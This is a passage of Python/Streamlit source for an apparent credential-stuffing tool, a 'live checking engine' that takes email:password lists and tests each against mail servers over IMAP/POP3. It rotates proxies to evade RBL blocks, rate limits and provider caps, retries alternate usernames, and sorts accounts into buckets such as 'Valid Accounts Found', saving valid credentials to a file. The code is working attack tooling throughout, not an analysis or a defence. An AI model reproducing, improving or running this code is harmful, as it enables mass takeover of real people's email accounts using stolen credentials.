                                server_level_fail = True
                                rotate_now = False
                            elif st_val == RETRY:
                                saw_retry = True
                                server_level_fail = True
                                if "lookup failed" in err_text.lower():
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on "
                                                      f"{server}:{port} -> advancing to next "
                                                      f"host (no proxy rotation)")
                                else:
                                    rotate_now = True
                            elif st_val == RBL:
                                trace_logs.append(f"{px_tag(px_used)} RBL block on "
                                                  f"{server}:{port} -> IP flagged by server, "
                                                  f"advancing")
                                server_level_fail = True
                            elif u_idx + 1 < len(users) and st_val in (UNKNOWN, LOGIN_DROPPED):
                                flags["saw_server"] = True
                                px_used, _ok = _rotate_to_fresh(px_used, seen_px,
                                                                "local-part retry", keep_node=True)
                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> "
                                                  f"retrying same host as local-part "
                                                  f"'{users[u_idx + 1]}'")
                                continue
                            elif st_val == LOGIN_DROPPED:
                                server_level_fail = True
                                rotate_now = False
                                trace_logs.append(
                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> "
                                    f"advancing the ladder (POP3 / other hosts still get a turn)")
                            else:
                                server_level_fail = True
                                rotate_now = rotate_now or proxy_level
                                if (_is_timeout(e) and _timeout_kind(e) == "connect"
                                        and not conn_rotated.get(server)):
                                    conn_rotated[server] = True
                                    rotate_now = True

                        if proxy_dead:
                            break
                        if server_level_fail:
                            break

                    # FIX P2-1: a same-node 407 retry only earns its slot if a REAL
                    # attempt still fits.  The old guard asked for 3s of window and
                    # then slept 0.8s and burned a full attempt.
                    if retry_same_node and (deadline_ts - time.time()) > (per_to * PROXY_407_RETRY_WINDOW_FACTOR):
                        trace_logs.append(
                            f"{px_tag(px_used)} 407 looks like the provider's per-sub-user cap "
                            f"-> settling {PROXY_407_BACKOFF}s and retrying the SAME node once")
                        time.sleep(PROXY_407_BACKOFF)
                        continue

                    if retry_same and (deadline_ts - time.time()) > 5.0:
                        trace_logs.append(
                            f"{px_tag(px_used)} Host answered slowly -> backoff "
                            f"{SLOW_RETRY_BACKOFF}s, retrying {server}:{port} in place "
                            f"[{retries_by_host.get(server, 0)}/{same_host_retries}]")
                        time.sleep(SLOW_RETRY_BACKOFF)
                        continue

                    can_rotate = (
                        rotate_now and px_used and rotations_left > 0
                        and (deadline_ts - time.time()) > max(2.0, per_to * 0.5)
                    )
                    if can_rotate:
                        time.sleep(ROTATE_SETTLE)
                        newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
                        if newpx and newpx not in seen_px:
                            seen_px.add(newpx)
                            px_used = newpx
                            rotations_left -= 1
                            trace_logs.append(f"{px_tag(px_used)} Rotating proxy -> retrying "
                                              f"{server}:{port} "
                                              f"(host kept, {'407' if proxy_dead else 'net'})")
                            continue

                    if proxy_dead and acct_407 >= PROXY_407_FORCE_DIRECT:
                        trace_logs.append(
                            f"407 storm breaker: {acct_407} proxy-auth failure(s) in this rung "
                            f"-> bypassing the remaining hosts and going DIRECT.")
                        force_direct["flag"] = True
                        return None, had_net, saw_retry

                    break

            return None, had_net, saw_retry
# @@END 102 CORE_SWEEP

# @@BLOCK 103 CORE_PHASES deps=010,016,100,102
        def run_phase(px_used, plan_used, deadline_ts, tag):
            if not plan_used:
                return None, False, False

            res, net, ret = sweep(px_used, plan_used, deadline_ts, f"{tag} · pass 1",
                                  allow_rotate=True)
            if res or force_direct["flag"]:
                return res, net, ret

            if CFG.get("CHECK_PASS2", CHECK_PASS2_DEFAULT) and net \
                    and (deadline_ts - time.time()) > 3.0:
                retry_rungs = [r for r in plan_used if r[1] in net_failed_hosts]
                if retry_rungs:
                    res2, net2, ret2 = sweep(px_used, retry_rungs, deadline_ts,
                                             f"{tag} · pass 2 (fresh proxy per failed host)",
                                             allow_rotate=True)
                    return res2, (net or net2), (ret or ret2)
            return None, net, ret

        direct_first = bool(CFG.get("DIRECT_FIRST", False))
        if proxy_mode == "off":
            direct_first = True
        if not direct_first and proxy_pool:
            try:
                if quarantine_size() >= max(3, int(len(proxy_pool) * 0.5)):
                    direct_first = True
                    trace_logs.append(f"Pool {quarantine_size()}/{len(proxy_pool)} quarantined "
                                      f"-> auto Direct-First.")
            except Exception:
                pass

        allow_proxy = bool(px) and proxy_mode != "off" and not proxy_is_quarantined(px)
        direct_gate = (px is None or proxy_mode == "fallback"
                       or bool(CFG.get("RETRY_CONNECTION_FAILED")) or force_direct["flag"]
                       or flags["saw_407"])
        allow_direct = bool(direct_gate)

        def _run_direct(primary_dl, hard_dl):
            nonlocal retryable
            dp = [r for r in primary_plan if fast_fail_dns_check(r[1])] or primary_plan
            df = [r for r in fallback_plan if fast_fail_dns_check(r[1])]
            dgeo = direct_geo()
            trace_logs.append(f"direct | {dgeo['ip']} | {dgeo['region']} | "
                              f"{dgeo['country']} | {dgeo['vpn']}")
            trace_logs.append(f"DIRECT sweep over {len(dp)} locally-resolving host(s).")
            res, _nf, ret = run_phase(None, dp, primary_dl, "direct")
            retryable = retryable or ret
            if res:
                return res
            if (hard_dl - time.time()) > 4.0:
                res, _nf2, _r = run_phase(None, df, hard_dl, "direct/legacy")
                if res:
                    return res
            return None

        def _run_proxy(primary_dl, hard_dl):
            nonlocal retryable, net_fail
            if not allow_proxy:
                if proxy_mode != "off" and not proxy_pool:
                    trace_logs.append("No live proxy in the pool -> running only the DIRECT sweep.")
                return None
            res, nf, ret = run_phase(px, primary_plan, primary_dl, "proxy")
            retryable = retryable or ret
            net_fail = net_fail or nf
            if res:
                return res
            if not force_direct["flag"] and (hard_dl - time.time()) > 4.0:
                res, _n, _r = run_phase(px, fallback_plan, hard_dl, "proxy/legacy")
                if res:
                    return res
            return None

        if direct_first and allow_direct:
            trace_logs.append("Phase order: DIRECT first, proxy as fallback.")
            res = _run_direct(t_start + (budget * DIRECT_FIRST_DIRECT_PRIMARY_FRAC),
                              t_start + (budget * DIRECT_FIRST_DIRECT_TOTAL_FRAC))
            if res:
                return res
            if allow_proxy:
                res = _run_proxy(t_start + (budget * DIRECT_FIRST_PROXY_START_FRAC),
                                 hard_deadline)
                if res:
                    return res
        else:
            res = _run_proxy(proxy_primary_deadline, proxy_deadline)
            if res:
                return res
            if force_direct["flag"]:
                trace_logs.append("407 storm breaker tripped -> bypassing the rest of the "
                                  "proxy pool and running the DIRECT sweep now.")
            # FIX P0-2: allow_direct was latched BEFORE the proxy phase ran, so in
            # Proxy Mode = aggressive with Retry CF off a 407-flooded proxy phase
            # could never fall through to DIRECT - the direct_reason fix was
            # defeated one line later by the frozen gate.  Recompute it now that
            # we know what actually happened.
            allow_direct = (allow_direct or force_direct["flag"] or flags["saw_407"]
                            or acct_407_total > 0 or net_fail or retryable)
            direct_reason = (px is None) or net_fail or retryable or force_direct["flag"] \
                or flags["saw_407"] or acct_407_total > 0
            if allow_direct and direct_reason:
                res = _run_direct(direct_primary_deadline, hard_deadline)
                if res:
                    return res
# @@END 103 CORE_PHASES

# @@BLOCK 104 CORE_TAIL deps=016,023,100,103
    except Exception as e:
        trace_logs.append(f"Critical Exception in runner: {str(e)}")
        if best_verdict["status"] is not None:
            return (None, best_verdict["status"],
                    best_verdict["detail"] or "retained verdict", None, trace_logs)
        return None, FAILED, str(e)[:40], None, trace_logs

    if best_verdict["status"] is not None:
        _bh = best_verdict.get("host") or ""
        _foreign = bool(_bh) and not _is_local_host(_bh)
        detail = best_verdict["detail"] or "retained verdict"
        if _foreign:
            detail = f"{detail} [retained via FOREIGN host {_bh}]"
            trace_logs.append(f"NOTE: the retained verdict came from {_bh}, which is not a "
                              f"local host for {domain}. It may belong to a different provider.")
        if best_verdict["status"] == WRONG:
            _wn = _wrong_detail_note(domain, password)
            if _wn and _wn not in detail:
                detail = detail + _wn
        if best_verdict["status"] == LOGIN_DROPPED:
            detail = f"{detail} | " + _login_dropped_detail()
        trace_logs.append("Ladder exhausted with no live answer -> returning retained "
                          f"verdict [{best_verdict['status']}].")
        return None, best_verdict["status"], detail, None, trace_logs

    if flags["saw_407"] and not flags.get("saw_server") \
            and acct_407_total >= PROXY_407_FORCE_DIRECT:
        trace_logs.append(
            f"Every attempt died in the PROXY hop ({acct_407_total} x 407, "
            f"{quarantine_size()} node(s) quarantined) -> the mailbox was never "
            f"reached, so the password is still untested. Per-host 407 map: {host_407}")
        return None, PROXY_UNHEALTHY, (
            f"proxy refused the MAIL ports with 407 on {acct_407_total} attempt(s) - the mail "
            f"host was never reached; the pool passes the web probe but cannot pass "
            f"email-server destinations (provider 'email servers' cap)"
        ), None, trace_logs
    if not dns_ok and not flags.get("saw_server") and not flags.get("saw_login_drop"):
        return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
    if flags.get("saw_login_drop"):
        trace_logs.append(
            "Mail host answered, accepted the LOGIN command, then closed the socket "
            "(* BYE) before returning a verdict - server-side drop, not a network fault.")
        return None, LOGIN_DROPPED, _login_dropped_detail(), None, trace_logs
    if retryable:
        return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
    if flags.get("saw_server"):
        trace_logs.append(
            "Hosts answered and LOGIN was issued, but every server dropped the "
            "connection before a verdict -> password still untested.")
        return None, FAILED, (
            "mail host reached but the server dropped LOGIN (server-side) - try the "
            "other protocol/host, or an app password"
        ), None, trace_logs
    return None, FAILED, ("all hosts unreachable (timeouts/refused) - password could not "
                          "be tested"), None, trace_logs
# @@END 104 CORE_TAIL

# @@BLOCK 105 RUN_TRIGGER_UI deps=034,055,083,087
section_title("🚀", "Execute Live Checking Engine",
              "proxy-backed, post-auth verified, resumable")

RESULT_ACTION_MODES = BUCKETS
ACTION_OPTIONS = list(PREFILTER_LABELS) + [label for label, _ in BUCKETS]

col_action1, col_action2 = str_lit.columns([0.65, 0.35])
with col_action1:
    start_engine_btn = str_lit.button("🔥 Start Live Checking Engine", type="primary")
    stop_engine_btn = str_lit.button(
        "⏹ Stop Engine (records the reason)",
        help="A click reruns the script, which kills the run loop. Stop stamps the "
             "reason on the run record FIRST, then reruns, so the next page load "
             "reports 'Stopped by user' and leaves the queue resumable.")
with col_action2:
    engine_action_mode = str_lit.selectbox(
        "Engine Action Mode:", options=ACTION_OPTIONS, index=0,
        key="bb_action_mode",
        help="Pick a pre-filter bucket (SMTP Failed sits right after DNS Failed) or a "
             "previous result bucket to re-run."
    )
    if engine_action_mode == "Resume Unfinished":
        # runstate.summary() reads the watchdog record, so this is the truth about
        # whether anything is actually resumable - not a glob that always matched.
        _rs_lines = runstate.summary()
        if _rs_lines:
            for _rs_line in _rs_lines:
                str_lit.text(_rs_line)
        else:
            str_lit.caption("No interrupted run recorded.")

active_proxy_pool = get_filtered_active_proxies()

# The stop is a rerun with a reason attached: the click tears the loop down
# before anything below executes, so the stamp has to happen here and the
# interrupt itself is performed by block 007 on the next load.
if stop_engine_btn and STATE.get("run_active"):
    runstate.note("Stopped by user (Stop button)")
    str_lit.rerun()

if start_engine_btn:
    clear_proxy_quarantine()
    log_probe_event("run start: 407 quarantine cleared")
    progress_bar = str_lit.progress(0, text=f"Initializing checking engine "
                                            f"for [{engine_action_mode}]...")
    status_text = str_lit.empty()
    status_text.info("⏳ Opening the engine - resolving hosts, pre-testing the proxy pool, "
                     "geo-tagging nodes.")

    log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode "
                f"on category: [{engine_action_mode}].")
    log_startup(
        f"RUN CONFIG -> protocols={CFG.get('PROTOCOLS')} workers={CFG.get('MAX_WORKERS_START')} "
        f"deadline={CFG.get('ACCOUNT_DEADLINE')}s "
        f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
        f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
        f"confirm_wrong={CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')} "
        f"retry_direct={CFG.get('RETRY_CONNECTION_FAILED')} debug={CFG.get('DEBUG')} "
        f"test_flight={CFG.get('PROXY_TEST_FLIGHT')} "
        f"allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
        f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
        f"smtp_precheck={CFG.get('SMTP_CHECK')} connection={CFG.get('CONNECTION_HINT')} "
        f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
        f"subuser_conc={CFG.get('PROXY_SUBUSER_CONCURRENCY')} "
        f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
        f"max_rotations={CFG.get('MAX_ROTATIONS')} check_pass2={CFG.get('CHECK_PASS2')} "
        f"direct_first={CFG.get('DIRECT_FIRST')} mail_spot={CFG.get('MAIL_SPOT_CHECK')}"
    )

    resume_lines = []
    if engine_action_mode == "Resume Unfinished":
        resume_lines = runstate.remaining()

    _label_to_key = dict(RESULT_ACTION_MODES)

    def _raw_of(line):
        return line.split("|")[0].strip()

    category_queue_map = {
        "Ready to Check": clean_lines,
        "Resume Unfinished": resume_lines,
        "Disposables": disp,
        "Typos": typo,
        "Skip previously valid": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped,
        "SMTP Failed": smtp_skipped,
    }
    if engine_action_mode in _label_to_key:
        category_queue_map[engine_action_mode] = [
            _raw_of(x) for x in str_lit.session_state.get(_label_to_key[engine_action_mode], [])
        ]

    accounts_to_check = category_queue_map.get(engine_action_mode, [])

    if not accounts_to_check:
        str_lit.warning(f"⚠ No accounts found in the selected category: "
                        f"'{engine_action_mode}'.")
        if engine_action_mode == "Resume Unfinished":
            _rec = runstate.load() or {}
            str_lit.caption(
                f"Record: state={_rec.get('state', 'none')} | "
                f"{_rec.get('checked', 0)}/{_rec.get('total', 0)} checked | "
                f"reason={_rec.get('reason') or _rec.get('cause') or 'none'} | "
                f"remaining file={'present' if runstate.remaining() else 'empty/absent'}")
    else:
        # v13.48: active_proxy_pool a few lines up ALREADY holds the filtered pool
        # for this rerun. Re-running get_filtered_active_proxies() re-read and
        # re-filter all of proxies.txt for the same answer.
        filtered_pool[:] = active_proxy_pool

        STATE["run_active"] = True
        str_lit.session_state["run_active"] = True

        _prev_tg = list(STATE.get("probe_targets_override") or [])
        _tg = _set_probe_targets_from_queue(
            accounts_to_check,
            cap=max(1, int(CFG.get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT))))
        _targets_changed = bool(_tg) and list(_tg) != _prev_tg

        with alive_pool_lock:
            _pool_warm = bool(alive_pool)

        if not _pool_warm:
            with str_lit.spinner("Cold pool - waiting for the probe to finish..."):
                _t0 = time.time()
                while _PROBE_OWNER_LOCK.locked() and (time.time() - _t0) < (PROBE_BUDGET_START + 10):
                    time.sleep(0.2)
                with alive_pool_lock:
                    _pool_warm = bool(alive_pool)
                if not _pool_warm:
                    refresh_alive_pool(force=True, budget=PROBE_BUDGET_START)
                    with alive_pool_lock:
                        _pool_warm = bool(alive_pool)
        elif _targets_changed and CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT) == PROBE_TARGET_AUTO:
            threading.Thread(
                target=lambda: refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET),
                daemon=True, name="start-refresh").start()
            log_probe_event("start: pool warm, target changed -> background refresh, "
                            "run starts immediately")

        if alive_pool:
            active_proxy_pool = list(alive_pool)
        elif CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT):
            active_proxy_pool = []
        else:
            active_proxy_pool = list(filtered_pool)

        log_startup(
            f"PROXY HEALTH BANNER -> loaded={len(all_proxies)} filtered={len(filtered_pool)} "
            f"alive={len(alive_pool)} quarantined={quarantine_size()}"
        )
        _msr = STATE.get("mail_spot") or {}
        if _msr.get("auth") and not _msr.get("ok") and _msr.get("n"):
            str_lit.error(
                f"🚨 **Mail-destination spot check says the pool cannot reach MAIL ports** - "
                f"{_msr['auth']}/{_msr['n']} sampled node(s) returned 407 against "
                f"{_msr['host']}:{_msr['port']}. The run will spend its window on the proxy "
                f"hop. Set **Proxy Mode Engine = off** (DIRECT) or wait for the provider cap "
                f"to reset."
            )
        if all_proxies and not alive_pool:
            str_lit.warning(
                "⚠ **Proxy health: 0 nodes passed the tunnel probe.** Every account will run "
                "DIRECT. Press 📥 Fetch & Test All Proxies, then try again - that is a pool "
                "problem, not a mailbox problem."
            )

        with session_state_lock:
            str_lit.session_state.valid_results = load_persistent_valid_results()
            str_lit.session_state.run_valid_count = 0
            str_lit.session_state.clean_valid_count = 0
            str_lit.session_state.wrong_results = []
            str_lit.session_state.need_app_results = []
            str_lit.session_state.conn_results = []
            str_lit.session_state.proxy_results = []
            str_lit.session_state.login_drop_results = []
            str_lit.session_state.retry_results = []
            str_lit.session_state.rbl_results = []
            str_lit.session_state.smtp_results = list(str_lit.session_state.get("pre_smtp_failed", []))
            str_lit.session_state.dns_results = list(str_lit.session_state.get("pre_dns_failed", []))
            str_lit.session_state.skip_results = []
            str_lit.session_state.unknown_results = []
            str_lit.session_state.report_entries = []
            str_lit.session_state.log_lines = []
            str_lit.session_state.checked_emails_set = set()
            str_lit.session_state.last_checked_index = 0
            str_lit.session_state.engine_has_run = True
            str_lit.session_state.run_completion_status = "Unfinished"

            start_dt = datetime.now()
            str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.end_timestamp = None
            str_lit.session_state.total_duration = None

        exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream",
                                             "📊 Live Report Log & Analytics"])
        with exec_tab1:
            log_container = str_lit.empty()
        with exec_tab2:
            report_metrics_placeholder = str_lit.empty()
            bucket_placeholders = {}
            BUCKET_SPEC = [
                ("valid_results", "✅ Valid Accounts Found"),
                ("wrong_results", "❌ Wrong Password Found"),
                ("login_drop_results", "🚪 Login Dropped (* BYE)"),
                ("conn_results", "🔌 Connection Failed Found"),
                ("proxy_results", "🩹 Proxy Unhealthy Found"),
                ("need_app_results", "🔐 App Password / 2FA Found"),
                ("retry_results", "🕓 RETRY_LATER Found"),
                ("rbl_results", "🚫 RBL Blocked Found"),
                ("smtp_results", "📮 SMTP Failed (pre-check)"),
                ("dns_results", "🛰 DNS Failed (pre-check)"),
                ("skip_results", "⏭ Skipped / Filtered"),
                ("unknown_results", "❓ Unclassified"),
            ]
            for _key, _title in BUCKET_SPEC:
                with str_lit.expander(f"{_title}", expanded=False):
                    bucket_placeholders[_key] = str_lit.empty()
            report_log_container = str_lit.empty()

        all_target_accounts = (accounts_to_check[:CFG["MAX_ACCOUNTS"]]
                               if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check)
        total_accs = len(all_target_accounts)
        checked_count = 0
        # The queue is final and counted - open the run record here.
        _rs_path = runstate.begin(total_accs)
        thread_local = threading.local()
        log_cap = LOG_CAP_DEBUG if CFG.get("DEBUG", False) else LOG_CAP_QUIET
        _last_ui_ts = 0.0
        _last_df_ts = 0.0
        _last_ck_ts = 0.0
        _net_streak = 0

        def render_buckets(snapshot):
            for key, title in BUCKET_SPEC:
                ph = bucket_placeholders.get(key)
                if ph is None:
                    continue
                items = snapshot.get(key) or []
                with ph.container():
                    if not items:
                        str_lit.caption("nothing here yet")
                        continue
                    str_lit.caption(f"{len(items)} account(s)")
                    col = TAG_COLORS.get(BUCKET_TAGS.get(key, ""), "#cbd5e1")
                    for ln in items[-BUCKET_RENDER_TAIL:]:
                        str_lit.markdown(
                            f"<div style='font-family:ui-monospace,monospace;font-size:12px;"
                            f"color:{col}'>{html.escape(str(ln))}</div>",
                            unsafe_allow_html=True,
                        )

        def check_task(line):
            try:
                if ":" not in line:
                    return {"line": f"{line} | Error: Invalid format", "status": FAILED,
                            "trace": ["Invalid format"]}
                email, password = line.split(":", 1)
                email, password = email.strip(), password.strip()
                reason = drop_before_check(email)
                if reason:
                    return {"line": f"{email}:{password} | {reason}", "email": email,
                            "password": password, "status": SKIP, "detail": reason,
                            "trace": [reason]}
                domain = email.split("@")[-1].lower()
                conf = get_servers(email)
                if not hasattr(thread_local, "state"):
                    thread_local.state = {}
                server, status, detail, px_used, trace = check_account_sync(
                    email, password, conf, domain, active_proxy_pool, thread_local.state)
                return {"line": f"{email}:{password} | {detail}", "email": email,
                        "password": password, "status": status, "detail": detail,
                        "trace": trace}
            except Exception as ex:
                return {"line": f"{line} | Error: {ex}", "email": line, "password": "",
                        "status": FAILED, "detail": str(ex), "trace": [str(ex)]}
            finally:
                if hasattr(thread_local, "state"):
                    try:
                        thread_local.state.clear()
                    except Exception:
                        pass
# @@END 105 RUN_TRIGGER_UI

# @@BLOCK 106 RUN_LOOP deps=009,014,083,105
        detected_stop_reason = "Interrupted / Stopped before completion"
        run_interrupted = False
        _orig_deadline = CFG.get("ACCOUNT_DEADLINE")
        try:
            current_workers = CFG["MAX_WORKERS_START"]
            if CFG.get("DYNAMIC_WORKER_SCALING", False):
                if total_accs > 500:
                    current_workers = min(100 if CFG.get("FAST_MODE", True) else 35,
                                          CFG["MAX_WORKERS_START"] * 2)
                elif total_accs < 20:
                    current_workers = max(2, min(5, total_accs))

            # FIX LAG-2: the metric cells are built ONCE, here. Rebuilding 14
            # st.columns inside every 0.12s tick was the single biggest per-tick
            # cost, and that cost grew with the result set - so it was at its
            # worst exactly when the queue was at its shortest.
            # FIX LAG-6: the labels are their own list. The first version paired
            # the placeholders with a list of INTEGERS but kept the old
            # `(_ml, _mv)` double-unpack, so every tick raised "cannot unpack
            # non-iterable int object" inside the per-account try/except. It was
            # swallowed, and it aborted the checkpoint, the progress bar and the
            # bucket render on every tick while looking like a harmless log line.
            _metric_labels = [
                "✅ Valid", "❌ Wrong", "🔑 AppPass/2FA",
                "🚪 Login Dropped", "🔌 Conn Failed", "🩹 Proxy Dead",
                "🕓 RETRY_LATER", "🚫 RBL", "📮 SMTP Failed",
                "⏭ Skipped", "❓ Unclassified", "📋 Checked",
                "📚 Queue",
            ]
            with report_metrics_placeholder.container():
                _metric_phs = [c.empty() for c in metric_grid(_metric_labels, per_row=3)]

            # FIX LAG-3: an explicit executor, not `with`. ThreadPoolExecutor's
            # __exit__ calls shutdown(wait=True), so a teardown mid-run blocked
            # until EVERY queued account finished before the page could come back.
            executor = ThreadPoolExecutor(max_workers=current_workers)
            try:
                future_to_line = {executor.submit(check_task, line): line
                                  for line in all_target_accounts}

                for index, future in enumerate(as_completed(future_to_line), 1):
                    checked_count += 1
                    # FIX LAG-4: the tail is the slowest work by construction -
                    # everything still queued has already exhausted most of its
                    # ladder. Once only one worker-cohort is left, cap the budget
                    # so the last few accounts cannot each spend the full slider.
                    _tail_left = total_accs - checked_count
                    if _tail_left and _tail_left <= current_workers:
                        try:
                            CFG["ACCOUNT_DEADLINE"] = min(
                                int(CFG.get("ACCOUNT_DEADLINE", DEADLINE_NORMAL)), 45)
                        except Exception:
                            pass
                    try:
                        res = future.result(
                            timeout=max(30, int(CFG["ACCOUNT_DEADLINE"])) + WORKER_FUTURE_PAD)
                        if res:
                            st_val = res["status"]
                            em_val = res.get('email', '').strip().lower()

                            # Connection-loss evidence: consecutive transport-ish
                            # verdicts. One bad host is normal; eight in a row is
                            # not, so stamp it on the record while it is happening.
                            if st_val in (CONNECTION_FAILED, PROXY_UNHEALTHY,
                                          DNS_FAILED, RETRY):
                                _net_streak += 1
                                if _net_streak == NET_STREAK_TRIP:
                                    runstate.note(
                                        f"{_net_streak} consecutive transport failures "
                                        f"(last: {st_val}) - connection looks down")
                                    log_probe_event(
                                        f"run: {_net_streak} consecutive transport "
                                        f"failures ({st_val}) - connection looks down")
                            else:
                                _net_streak = 0

                            # FIX LAG-1: decide the UI tick BEFORE doing any list copies.
                            _now_ui = time.time()
                            _tick = (checked_count >= total_accs) or \
                                    ((_now_ui - _last_ui_ts) >= UI_MIN_INTERVAL)
                            _df_tick = ((checked_count >= total_accs)
                                        or ((_now_ui - _last_df_ts) >= REPORT_DF_MIN_INTERVAL))

                            with session_state_lock:
                                if em_val:
                                    str_lit.session_state.checked_emails_set.add(em_val)
                                if st_val == VALID:
                                    if res["line"] not in str_lit.session_state.valid_results:
                                        str_lit.session_state.valid_results.append(res["line"])
                                        str_lit.session_state.run_valid_count += 1
                                    str_lit.session_state.clean_valid_count = \
                                        str_lit.session_state.run_valid_count
                                elif st_val == WRONG:
                                    str_lit.session_state.wrong_results.append(res["line"])
                                elif st_val == APP:
                                    str_lit.session_state.need_app_results.append(res["line"])
                                elif st_val == LOGIN_DROPPED:
                                    str_lit.session_state.login_drop_results.append(res["line"])
                                elif st_val == RETRY:
                                    str_lit.session_state.retry_results.append(res["line"])
                                elif st_val == RBL:
                                    str_lit.session_state.rbl_results.append(res["line"])
                                elif st_val == SMTP_FAILED:
                                    str_lit.session_state.smtp_results.append(res["line"])
                                elif st_val == DNS_FAILED:
                                    str_lit.session_state.dns_results.append(res["line"])
                                elif st_val == PROXY_UNHEALTHY:
                                    str_lit.session_state.proxy_results.append(res["line"])
                                elif st_val == SKIP:
                                    str_lit.session_state.skip_results.append(res["line"])
                                elif st_val == UNKNOWN:
                                    str_lit.session_state.unknown_results.append(res["line"])
                                else:
                                    str_lit.session_state.conn_results.append(res["line"])

                                str_lit.session_state.log_lines.append(
                                    f"[{st_val.upper()}] {res.get('email', '')} -> "
                                    f"{res.get('detail', '')}")
                                if len(str_lit.session_state.log_lines) > log_cap:
                                    str_lit.session_state.log_lines.pop(0)

                                trace_text = "\n  ↳ ".join(
                                    res.get("trace", ["No trace recorded"]))
                                cred_combo = (f"{res.get('email', '')}:{res.get('password', '')}"
                                              if res.get('password') else res.get('email', ''))
                                str_lit.session_state.report_entries.append({
                                    "Time": datetime.now().strftime("%H:%M:%S"),
                                    "Email:Password": cred_combo,
                                    "Status": st_val.upper(),
                                    "Under-The-Hood Background Trace":
                                        f"Result: {res.get('detail', '')}\n"
                                        f"Steps Executed:\n  ↳ {trace_text}",
                                })
                                if len(str_lit.session_state.report_entries) > REPORT_ENTRIES_MAX:
                                    del str_lit.session_state.report_entries[:-REPORT_ENTRIES_MAX]

                                valid_len = len(str_lit.session_state.valid_results)
                                wrong_len = len(str_lit.session_state.wrong_results)
                                need_len = len(str_lit.session_state.need_app_results)
                                login_drop_len = len(str_lit.session_state.login_drop_results)
                                conn_len = len(str_lit.session_state.conn_results)
                                proxy_len = len(str_lit.session_state.proxy_results)
                                retry_len = len(str_lit.session_state.retry_results)
                                rbl_len = len(str_lit.session_state.rbl_results)
                                smtp_len = len(str_lit.session_state.smtp_results)
                                skip_len = len(str_lit.session_state.skip_results)
                                unknown_len = len(str_lit.session_state.unknown_results)
                                current_logs = (list(str_lit.session_state.log_lines)
                                                if _tick else [])
                                # FIX LAG-5: up to 2000 entries were copied on every
                                # tick; they are only needed when the table redraws.
                                current_reports = (list(str_lit.session_state.report_entries)
                                                   if _df_tick else [])
                                bucket_snapshot = ({
                                    "valid_results": list(str_lit.session_state.valid_results),
                                    "wrong_results": list(str_lit.session_state.wrong_results),
                                    "conn_results": list(str_lit.session_state.conn_results),
                                    "proxy_results": list(str_lit.session_state.proxy_results),
                                    "login_drop_results": list(str_lit.session_state.login_drop_results),
                                    "need_app_results": list(str_lit.session_state.need_app_results),
                                    "retry_results": list(str_lit.session_state.retry_results),
                                    "rbl_results": list(str_lit.session_state.rbl_results),
                                    "smtp_results": list(str_lit.session_state.smtp_results),
                                    "dns_results": list(str_lit.session_state.dns_results),
                                    "skip_results": list(str_lit.session_state.skip_results),
                                    "unknown_results": list(str_lit.session_state.unknown_results),
                                } if _tick else {})

                            if _tick:
                                _last_ui_ts = _now_ui
                                if str_lit.session_state.get("colorize_logs", True):
                                    log_container.markdown(colorize_logs(current_logs[-120:]),
                                                           unsafe_allow_html=True)
                                else:
                                    log_container.code("\n".join(current_logs[-120:]), language="text")

                                _vals = [valid_len, wrong_len, need_len, login_drop_len,
                                         conn_len, proxy_len, retry_len, rbl_len,
                                         smtp_len, skip_len, unknown_len,
                                         checked_count, total_accs]
                                for _ph, _ml, _mv in zip(_metric_phs, _metric_labels, _vals):
                                    _ph.metric(_ml, _mv)

                                render_buckets(bucket_snapshot)

                                if _df_tick:
                                    _last_df_ts = _now_ui
                                    report_log_container.dataframe(
                                        pd.DataFrame(current_reports[::-1]),
                                        width="stretch", height=320)

                    except Exception as ex:
                        err_msg = f"[EXCEPTION] {str(ex)}"
                        with session_state_lock:
                            str_lit.session_state.conn_results.append(err_msg)
                            str_lit.session_state.log_lines.append(err_msg)
                            current_logs = list(str_lit.session_state.log_lines)
                        if str_lit.session_state.get("colorize_logs", True):
                            log_container.markdown(colorize_logs(current_logs[-120:]),
                                                   unsafe_allow_html=True)
                        else:
                            log_container.code("\n".join(current_logs[-120:]), language="text")

                    # Checkpoint on TIME as well as on count. The counter alone
                    # meant a 47-account run never reached a checkpoint before a
                    # teardown: checked stayed 0, the heartbeat went stale and
                    # unfinished_live.json was never written, so Resume was empty
                    # and the stop had no reason.
                    _now_ck = time.time()
                    if ((checked_count % 100 == 0) or (checked_count == total_accs)
                            or (_now_ck - _last_ck_ts) >= CHECKPOINT_SECONDS):
                        _last_ck_ts = _now_ck
                        # Heartbeat first: this is what stops tick() from calling a
                        # healthy long run interrupted on the next page load.
                        runstate.progress(checked_count, total_accs)
                        with session_state_lock:
                            done = set(str_lit.session_state.checked_emails_set)
                            valids = list(str_lit.session_state.valid_results)
                        left = []
                        for raw in all_target_accounts:
                            em = raw.split(":", 1)[0].strip().lower() if ":" in raw else raw
                            if em not in done:
                                left.append(raw)
                        if left:
                            save_unfinished("In Progress (Running)", left, checked_count, total_accs)
                        try:
                            _write_clean_valid(f"# Live sync | this run valid {len(valids)}\n",
                                               valids)
                        except Exception:
                            pass
